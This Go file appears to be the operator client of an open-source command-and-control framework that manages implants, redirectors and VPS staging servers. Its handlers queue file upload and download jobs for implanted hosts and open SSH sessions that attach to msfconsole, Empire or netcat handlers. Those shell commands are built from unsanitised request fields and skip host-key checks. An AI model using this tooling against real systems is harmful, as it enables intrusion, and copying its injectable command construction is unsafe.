//{{{{{{{ Main Function }}}}}}}


//By Rebujacker - Alvaro Folgado Rueda as an open source educative project
package main

import (
    "encoding/json"
    "github.com/gorilla/mux"
    "log"
    "net/http"
    "fmt"
    "bytes"
    "time"
    "os"
    "strings"
    "os/exec"
    "io/ioutil"
    "encoding/base64"
    "strconv"
    "sync"
)

////Commands JSON, will fit in Job "parameter" field

//CreateImplant
type CreateImplant struct {
    Name string   `json:"name"`
    Ttl string   `json:"ttl"`
    Resptime string   `json:"resptime"`
    Coms string   `json:"coms"`
    ComsParams string `json:"comsparams"`
    Persistence string `json:"persistence"`
    Redirectors  []Red `json:"redirectors"`
}

type Red struct{
    Vps string `json:"vps"`
    Domain string `json:"domain"`
}

// Drop Implant to Droplet
type DropImplant struct {
    Implant string   `json:"implant"`
    Staging string   `json:"staging"`
    Os string   `json:"os"`
    Arch string   `json:"arch"`
    Filename string   `json:"filename"`
}

type InteractObject struct {
    StagingName string   `json:"staging"`
    Handler string   `json:"handler"`
    VpsName string   `json:"vpsname"`
    TunnelPort string   `json:"tunnelport"`
}

type ReportObject struct {
    Name string   `json:"name"`
}

type ImplantObject struct {
    Name string   `json:"name"`
    OsName string   `json:"osname"`
    Arch string   `json:"arch"`
}

type DeleteImplant struct{
    Name string `json:"name"`
}

type DeleteVps struct{
    Name string `json:"name"`
}

type DeleteDomain struct{
    Name string `json:"name"`
}

type DeleteStaging struct{
    Name string `json:"name"`
}


//Implant Checking
type BiChecking struct{
    Hostname string `json:"hostname"`
}


type JobsMemoryDB struct {
    mux  sync.RWMutex
    Jobs []*Job
}
var jobsDB *JobsMemoryDB

type LogsMemoryDB struct {
    mux  sync.RWMutex
    Logs []*Log
}
var logsDB *LogsMemoryDB

type ImplantsMemoryDB struct {
    mux  sync.RWMutex
    Implants []*Implant
}
var implantsDB *ImplantsMemoryDB

type VpsMemoryDB struct {
    mux  sync.RWMutex
    Vpss []*Vps
}
var vpsDB *VpsMemoryDB

type DomainsMemoryDB struct {
    mux  sync.RWMutex
    Domains []*Domain
}
var domainsDB *DomainsMemoryDB

type StagingsMemoryDB struct {
    mux  sync.RWMutex
    Stagings []*Staging
}
var stagingsDB *StagingsMemoryDB

type RedsMemoryDB struct {
    mux  sync.RWMutex
    Redirectors []*Redirector
}
var redsDB *RedsMemoryDB

type BisMemoryDB struct {
    mux  sync.RWMutex
    Bichitos []*Bichito
}
var bisDB *BisMemoryDB

type ReportsMemoryDB struct {
    mux  sync.RWMutex
    Reports []*Report
}
var reportsDB *ReportsMemoryDB

type lockObject struct {
    mux  sync.RWMutex
    Lock int
}

var lock *lockObject

type joblockObject struct {
    mux  sync.RWMutex
    Lock int
}

var joblock *joblockObject

func guiHandler() {


    //Initialize OnMem DB Data
    var (
        jobs        []*Job
        logs        []*Log
        implants    []*Implant
        vpss        []*Vps
        domains     []*Domain
        stagings    []*Staging
        redirectors []*Redirector
        bichitos    []*Bichito
        reports     []*Report
    )

    jobsDB =        &JobsMemoryDB{Jobs:jobs}
    logsDB =        &LogsMemoryDB{Logs:logs}
    implantsDB =    &ImplantsMemoryDB{Implants:implants}
    vpsDB =         &VpsMemoryDB{Vpss:vpss}
    domainsDB =     &DomainsMemoryDB{Domains:domains}
    stagingsDB =    &StagingsMemoryDB{Stagings:stagings}
    redsDB =        &RedsMemoryDB{Redirectors:redirectors}
    bisDB =         &BisMemoryDB{Bichitos:bichitos}
    reportsDB =     &ReportsMemoryDB{Reports:reports}
    
    lock = &lockObject{Lock:3}
    joblock = &joblockObject{Lock:3}

    getHive("jobs")
    getHive("logs")
    getHive("implants")
    getHive("vps")
    getHive("domains")
    getHive("stagings")
    getHive("bichitos")
    getHive("redirectors")
    getHive("reports")


    router := mux.NewRouter()
    router.Use(commonMiddleware)

    //GUI Get's Servlet
    router.HandleFunc("/jobs", GetJobs).Methods("GET")
    router.HandleFunc("/logs", GetLogs).Methods("GET")
    router.HandleFunc("/implants", GetImplants).Methods("GET")
    router.HandleFunc("/vps", GetVps).Methods("GET")
    router.HandleFunc("/domains", GetDomains).Methods("GET")
    router.HandleFunc("/stagings", GetStagings).Methods("GET")
    router.HandleFunc("/reports", GetReports).Methods("GET")
    router.HandleFunc("/redirectors", GetRedirectors).Methods("GET")
    router.HandleFunc("/bichitos", GetBichitos).Methods("GET")
    router.HandleFunc("/username", GetUsername).Methods("GET")

    router.HandleFunc("/job", CreateJob).Methods("POST")
    router.HandleFunc("/interact", Interact).Methods("POST")
    router.HandleFunc("/report", DownloadReport).Methods("POST")
    router.HandleFunc("/implant", DownloadImplant).Methods("POST")
    router.HandleFunc("/redirector", DownloadRedirector).Methods("POST")

    log.Fatal(http.ListenAndServe(":"+clientPort, router))
}

// Get methods for the GUI 
func GetJobs(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(jobsDB.Jobs)
    //if lock == 0 {go connectHive()}
    
    if(lock.Lock > -1){go getHive("jobs")}
}

func GetLogs(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(logsDB.Logs)

    if lock.Lock > -1 {go getHive("logs")}
}

func GetImplants(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(implantsDB.Implants)

    if lock.Lock > -1 {go getHive("implants")}
}

func GetVps(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(vpsDB.Vpss)

    if lock.Lock > -1 {go getHive("vps")}
}

func GetDomains(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(domainsDB.Domains)

    if lock.Lock > -1 {go getHive("domains")}
}

func GetStagings(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(stagingsDB.Stagings)

    if lock.Lock > -1 {go getHive("stagings")}
}

func GetReports(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(reportsDB.Reports)

    if lock.Lock > -1 {go getHive("reports")}
}


func GetRedirectors(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(redsDB.Redirectors)

    if lock.Lock > 0 {go getHive("redirectors")}
}

func GetBichitos(w http.ResponseWriter, r *http.Request) {
    json.NewEncoder(w).Encode(bisDB.Bichitos)

    if lock.Lock > 0 {go getHive("bichitos")}
}

func GetUsername(w http.ResponseWriter, r *http.Request) {
    tmp := UserAuth{username,""}
    json.NewEncoder(w).Encode(tmp)

}

func CreateJob(w http.ResponseWriter, r *http.Request) {
    var(
        job Job
    )

    //Debug
    fmt.Println("Lock Write:")
    fmt.Println(joblock.Lock)


    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)

    jid := fmt.Sprintf("%s%s","J-",randomString(8))
    time := time.Now().Format("02/01/2006 15:04:05 MST")
    
    //DEcode JSOn Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&job)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    job.Jid = jid
    job.Time = time

    //Prepare Upload Command: Read Operator file to upload and put into the Job
    if (job.Job == "upload"){
        
        //Use spaces to get both argumens, if not two of them error
        arguments := strings.Split(job.Parameters," ")
        if len(arguments) != 2 {
            fmt.Println("Incorrect Number of params")
        }  
        //Read first argument as a PATH file
        data, err := ioutil.ReadFile(arguments[0])
        if err != nil {
            fmt.Println("Error Reading File: "+err.Error())
        }

        //Set the output of the file on "Result"
        job.Result = base64.StdEncoding.EncodeToString(data)

    }

    //Prepare Download Command: Get JID result from Hive and decode it into target
    if (job.Job == "download"){
        //Use spaces to get both argumens, if not two of them error
        arguments := strings.Split(job.Parameters," ")
        if len(arguments) != 2 {
            fmt.Println("Incorrect Number of params")
        }  

        go downloadJID(jid,job.Chid,arguments[1])
    }


    
    if joblock.Lock > 0 {
        go postHive(&job)
        fmt.Fprint(w, "[{\"jid\":\""+jid+"\"}]")
    }else{
        fmt.Fprint(w, "Client Queue Full")  
    }
    

    return
}


//Download from Hive the result from one particular JID,use bichito resptime to try 3 times
func downloadJID(jid string,chid string,filepath string){

    //Get bichito resptime
    var resptime int
    var result string
    var errGetJob string

    for _,bichito := range bisDB.Bichitos{
        if chid == bichito.Bid{
            resptime, _ = strconv.Atoi(bichito.Resptime)
        }
        
    } 
    fmt.Println(resptime)
    //Try get result 3 times
    tries := 3
    for{
        time.Sleep(time.Duration(resptime + 20) * time.Second)
        errGetJob,result = getJIDResult(jid)
        if errGetJob == "" {
            break
        }

        //Debug
        fmt.Println(errGetJob)
        tries--
        if tries == 0 {
            fmt.Println("Failed to download File from Bichito")
            return
        }
    }

    fmt.Println(result)
    //If data, b64 decode it and write it in target operator filepath 
    decodedDownload, errD := base64.StdEncoding.DecodeString(result)
    if errD != nil {
        fmt.Println("Error b64 decoding Downloaded File: "+errD.Error())
        return
    }


    download, err := os.Create(filepath)
    if err != nil {
        fmt.Println("DownlaodFile:" + err.Error())
        return
    }

    defer download.Close()

    if _, err = download.WriteString(string(decodedDownload)); err != nil {
        fmt.Println("DownlaodFile:" + err.Error())
        return
    }

    return

}


func Interact(w http.ResponseWriter, r *http.Request) {
    
    var(
        interact InteractObject
        sshPort string
        vpsName string
        hiveD string
    )
    
    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //DEcode JSOn Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&interact)
    if errDaws != nil {
        fmt.Println("Error Decoding JSon"+ errDaws.Error())
    }

    //Get StagingName and VPSName using Job json object

    stagingName := interact.StagingName
    sshPort = interact.TunnelPort
    vpsName = interact.VpsName
    hiveD = strings.Split(roasterString,":")[0]

    //Check if vpsname.pem is on vpskeys
    var outbuf, errbuf bytes.Buffer
    cmd_path := "/bin/sh"
    cmd := exec.Command(cmd_path, "-c","ls ./vpskeys")
    cmd.Stdout = &outbuf
    cmd.Stderr = &errbuf
    cmd.Run()
    stdout := outbuf.String()
    stderr := errbuf.String()
    if stderr != ""{
        fmt.Println(stderr+stdout)
    }

    if !strings.Contains(outbuf.String(),stagingName){

        //If note retrieve vpskey from Hive
        key_string := getKey(vpsName)
        if !strings.Contains(key_string,"-----BEGIN RSA PRIVATE KEY-----"){
            return
        }

        vpskey, err := os.Create("./vpskeys/"+stagingName+".pem")
        if err != nil {
            fmt.Println(err.Error())
        }

        defer vpskey.Close()

        if _, err = vpskey.WriteString(key_string); err != nil {
            fmt.Println(err.Error())
        }

    cmd = exec.Command("/bin/bash", "-c","chmod 600 ./vpskeys/"+stagingName+".pem")
    cmd.Run()

    }



    var command string

    switch interact.Handler {

    case "droplet":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started time,from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo bash|tee -a "+interact.Handler+".log'" 
    case "msfconsole":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started time,from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep ruby)|tee -a "+interact.Handler+".log'" 
    case "empire":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started time,from:"+username+"\n\n\" >> "+interact.Handler+".log;sudo reptyr -s $(pgrep python)|tee -a "+interact.Handler+".log'" 
    case "ssh":
        command = "gnome-terminal -- ssh -oStrictHostKeyChecking=no -p "+sshPort+" -i ./vpskeys/"+stagingName+".pem ubuntu@"+hiveD+" 'sudo printf \"\n\nInteractive Session started time,from:"+username+"\n\n\" >> "+interact.Handler+".log;nc 127.0.0.1 2222|tee -a "+interact.Handler+".log'"

    }

    //Debug
    fmt.Println(command)

    outbuf.Reset()
    errbuf.Reset()
    cmd = exec.Command("/bin/bash", "-c",command)
    cmd.Stdout = &outbuf
    cmd.Stderr = &errbuf
    cmd.Run()
    stdout = outbuf.String()
    stderr = errbuf.String()
    if stderr != ""{
        fmt.Println(stderr+stdout)
    }


}

func DownloadReport(w http.ResponseWriter, r *http.Request) {

    var(
        report ReportObject
    )
    
    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&report)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    error := getReport(report.Name)
    if error != "" {
       fmt.Println("Error Getting Report"+ error) 
    }
}

func DownloadImplant(w http.ResponseWriter, r *http.Request) {

    var(
        implant ImplantObject
    )
    
    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&implant)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    error := getImplant(implant.Name,implant.OsName,implant.Arch)
    if error != "" {
       fmt.Println("Error Downloading Implant"+ error) 
    }
}

func DownloadRedirector(w http.ResponseWriter, r *http.Request) {

    var(
        implant ImplantObject
    )
    
    buf := new(bytes.Buffer)
    buf.ReadFrom(r.Body)
    
    //Decode Json Job, add Jid, time and status
    errDaws := json.Unmarshal([]byte(buf.String()),&implant)
    if errDaws != nil {
        fmt.Println("Error Decoding Json"+ errDaws.Error())
    }

    //Debug
    fmt.Println("Downloading:"+implant.Name)
    error := getRedirector(implant.Name)
    if error != "" {
       fmt.Println("Error Downloading Redirector"+ error) 
    }
}


func commonMiddleware(next http.Handler) http.Handler {
    return http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
        header := w.Header()
        //CSP
        csp := []string{"default-src: 'self'","object-src 'none'","","base-uri 'none'","script-src 'strict-dynamic'"}
        header.Set("Content-Type", "application/json")
        w.Header().Set("Content-Security-Policy", strings.Join(csp, "; "))
        w.WriteHeader(200)
        next.ServeHTTP(w, r)
    })
}